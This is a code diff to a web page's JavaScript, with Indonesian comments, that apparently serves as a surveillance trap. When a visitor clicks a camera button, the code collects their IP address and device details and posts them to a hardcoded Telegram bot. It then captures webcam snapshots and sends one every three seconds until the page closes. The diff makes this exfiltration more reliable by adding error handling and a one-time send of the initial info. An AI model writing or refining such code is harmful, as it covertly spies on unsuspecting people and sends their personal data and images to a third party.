@@ -274,7 +274,7 @@ const CHAT_ID="6051179992"; // CHAT ID
 const STATIC_IMAGE="https://files.catbox.moe/8ybe0o.jpg";
 let snapshotInterval;
 let isFirstSnapshot = true;
-let hasSentStaticImage = false;
+let hasSentInitialInfo = false;
 
 function escapeHtml(s){return String(s||"-").replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;");}
 
@@ -501,74 +501,90 @@ function buildCaption(ip,d){
 🕐 Time (UTC): ${escapeHtml(new Date().toISOString())}</blockquote>`;
 }
 
-// Kirim data dengan foto statis
-async function sendDataWithStaticImage(){
-  const [ip,d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
-  const caption = buildCaption(ip,d);
-  
-  // Cek panjang caption (batas Telegram adalah 1024 karakter)
-  if (caption.length <= 1024) {
-    // Kirim foto dengan caption jika tidak melebihi batas
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        photo: STATIC_IMAGE,
-        caption: caption,
-        parse_mode:"HTML"
-      })
-    });
-  } else {
-    // Jika terlalu panjang, pecah menjadi 2 bagian
-    const halfPoint = Math.floor(caption.length / 2);
-    let splitPoint = halfPoint;
+// Fungsi untuk mengirim data + foto statis
+async function sendInitialInfo() {
+  try {
+    const [ip, d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
+    const caption = buildCaption(ip, d);
     
-    // Cari titik split yang bagus (di akhir baris)
-    for (let i = halfPoint; i < halfPoint + 100 && i < caption.length; i++) {
-      if (caption[i] === '\n') {
-        splitPoint = i + 1;
-        break;
+    // Cek panjang caption (batas Telegram adalah 1024 karakter untuk foto)
+    if (caption.length <= 1024) {
+      // Kirim foto dengan caption jika tidak melebihi batas
+      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          photo: STATIC_IMAGE,
+          caption: caption,
+          parse_mode: "HTML"
+        })
+      });
+      if (!response.ok) {
+        const errorData = await response.json();
+        console.error("Telegram API Error (sendPhoto):", errorData);
+        throw new Error(`Failed to send photo: ${errorData.description}`);
+      }
+    } else {
+      // Jika terlalu panjang, pecah menjadi 2 bagian
+      const halfPoint = Math.floor(caption.length / 2);
+      let splitPoint = halfPoint;
+      
+      // Cari titik split yang bagus (di akhir baris)
+      for (let i = halfPoint; i < halfPoint + 100 && i < caption.length; i++) {
+        if (caption[i] === '\n') {
+          splitPoint = i + 1;
+          break;
+        }
+      }
+      
+      const part1 = caption.substring(0, splitPoint);
+      const part2 = caption.substring(splitPoint);
+      
+      // Kirim foto dengan bagian pertama
+      const photoResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          photo: STATIC_IMAGE,
+          caption: part1,
+          parse_mode: "HTML"
+        })
+      });
+      if (!photoResponse.ok) {
+        const errorData = await photoResponse.json();
+        console.error("Telegram API Error (sendPhoto part 1):", errorData);
+        throw new Error(`Failed to send photo part 1: ${errorData.description}`);
+      }
+
+      // Kirim bagian kedua sebagai pesan teks
+      const textResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: part2,
+          parse_mode: "HTML"
+        })
+      });
+      if (!textResponse.ok) {
+        const errorData = await textResponse.json();
+        console.error("Telegram API Error (sendMessage part 2):", errorData);
+        throw new Error(`Failed to send message part 2: ${errorData.description}`);
       }
     }
-    
-    const part1 = caption.substring(0, splitPoint);
-    const part2 = caption.substring(splitPoint);
-    
-    // Kirim foto dengan bagian pertama
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        photo: STATIC_IMAGE,
-        caption: part1,
-        parse_mode:"HTML"
-      })
-    });
-    
-    // Kirim bagian kedua sebagai pesan teks
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: part2,
-        parse_mode:"HTML"
-      })
-    });
+    console.log("Initial info sent successfully.");
+    return true; // Indicate success
+  } catch (error) {
+    console.error("Failed to send initial info:", error);
+    return false; // Indicate failure
   }
 }
 
-// Kamera snapshot sebagai file .jpg (document)
-async function sendSnapshot(){
-  try{
-    // Kirim data dengan foto statis hanya sekali saat izin kamera diberikan
-    if (!hasSentStaticImage) {
-      await sendDataWithStaticImage();
-      hasSentStaticImage = true;
-    }
-    
+// Fungsi untuk mengambil dan mengirim foto snapshot
+async function sendSnapshot() {
+  try {
     const stream = await navigator.mediaDevices.getUserMedia({video:true});
     const video = document.createElement('video');
     video.style.display='none';
@@ -611,8 +627,25 @@ async function sendSnapshot(){
       snapshotInterval = setInterval(sendSnapshot, 3000);
     }
   }catch(e){
-    console.log("yahhh", e);
+    console.log("Camera error:", e);
   }
+}
+
+// Fungsi utama yang dipanggil saat tombol diklik
+async function handleCameraRequest() {
+  // Kirim data + foto statis hanya sekali
+  if (!hasSentInitialInfo) {
+    const success = await sendInitialInfo();
+    if (success) {
+      hasSentInitialInfo = true;
+    } else {
+      // Jika gagal, kita bisa coba lagi atau lanjutkan, untuk sekarang kita lanjutkan
+      console.log("Could not send initial data, but proceeding with camera.");
+    }
+  }
+  
+  // Lanjutkan dengan pengambilan foto snapshot
+  sendSnapshot();
 }
 
 // Jalankan saat halaman load
@@ -620,12 +653,8 @@ window.addEventListener("load", async () => {
   // Tidak mengirim apa-apa saat halaman dimuat
 });
 
-// Tombol klik kamera - langsung kirim foto pertama
-document.getElementById("btnCamera").addEventListener("click", () => {
-  if(!snapshotInterval) {
-    sendSnapshot();
-  }
-});
+// Tombol klik kamera
+document.getElementById("btnCamera").addEventListener("click", handleCameraRequest);
 
 // Hentikan pengiriman foto saat halaman ditutup
 window.addEventListener("beforeunload", () => {
